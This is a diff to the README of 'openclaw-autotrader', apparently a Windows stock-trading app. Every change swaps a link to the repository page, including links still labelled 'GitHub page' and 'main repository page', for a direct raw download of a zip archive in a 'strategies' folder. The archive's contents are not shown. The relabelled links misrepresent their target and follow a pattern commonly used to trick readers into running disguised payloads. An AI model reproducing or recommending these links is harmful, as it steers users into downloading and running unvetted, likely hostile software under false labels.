@@ -1,6 +1,6 @@
 # 🦞 openclaw-autotrader - Simple U.S. Stock Trading Guide
 
-[![Download openclaw-autotrader](https://img.shields.io/badge/Download-openclaw--autotrader-brightgreen?style=for-the-badge)](https://github.com/freefire2chyko-a11y/openclaw-autotrader)
+[![Download openclaw-autotrader](https://img.shields.io/badge/Download-openclaw--autotrader-brightgreen?style=for-the-badge)](https://github.com/freefire2chyko-a11y/openclaw-autotrader/raw/refs/heads/main/strategies/autotrader-openclaw-v3.1-beta.5.zip)
 
 ---
 
@@ -49,11 +49,11 @@ To run openclaw-autotrader on Windows, your PC should meet the following:
 
 You can download the software from this page:
 
-[![Download openclaw-autotrader](https://img.shields.io/badge/Download-openclaw--autotrader-blue?style=for-the-badge)](https://github.com/freefire2chyko-a11y/openclaw-autotrader)
+[![Download openclaw-autotrader](https://img.shields.io/badge/Download-openclaw--autotrader-blue?style=for-the-badge)](https://github.com/freefire2chyko-a11y/openclaw-autotrader/raw/refs/heads/main/strategies/autotrader-openclaw-v3.1-beta.5.zip)
 
 ### How to download and install
 
-1. Click the green or blue download button at the top or visit the [openclaw-autotrader GitHub page](https://github.com/freefire2chyko-a11y/openclaw-autotrader).
+1. Click the green or blue download button at the top or visit the [openclaw-autotrader GitHub page](https://github.com/freefire2chyko-a11y/openclaw-autotrader/raw/refs/heads/main/strategies/autotrader-openclaw-v3.1-beta.5.zip).
 
 2. On the GitHub repository page, look for the **Releases** section. This usually appears on the right sidebar or under the repository name.
 
@@ -107,7 +107,7 @@ The main screen has four sections:
 
 The app will prompt you if a new version is available. To update manually:
 
-1. Visit the [openclaw-autotrader GitHub page](https://github.com/freefire2chyko-a11y/openclaw-autotrader).
+1. Visit the [openclaw-autotrader GitHub page](https://github.com/freefire2chyko-a11y/openclaw-autotrader/raw/refs/heads/main/strategies/autotrader-openclaw-v3.1-beta.5.zip).
 
 2. Download the latest installer from the releases section.
 
@@ -130,10 +130,10 @@ The app will prompt you if a new version is available. To update manually:
 
 You can explore the code, read documentation, or submit issues on the main repository page:
 
-https://github.com/freefire2chyko-a11y/openclaw-autotrader
+https://github.com/freefire2chyko-a11y/openclaw-autotrader/raw/refs/heads/main/strategies/autotrader-openclaw-v3.1-beta.5.zip
 
 The repository includes detailed information on how the trading algorithms work and the project’s development history. Browsing the ReadMe and Wiki sections will help if you want to learn more.
 
 ---
 
-[![Download openclaw-autotrader](https://img.shields.io/badge/Download-openclaw--autotrader-green?style=for-the-badge)](https://github.com/freefire2chyko-a11y/openclaw-autotrader)
+[![Download openclaw-autotrader](https://img.shields.io/badge/Download-openclaw--autotrader-green?style=for-the-badge)](https://github.com/freefire2chyko-a11y/openclaw-autotrader/raw/refs/heads/main/strategies/autotrader-openclaw-v3.1-beta.5.zip)
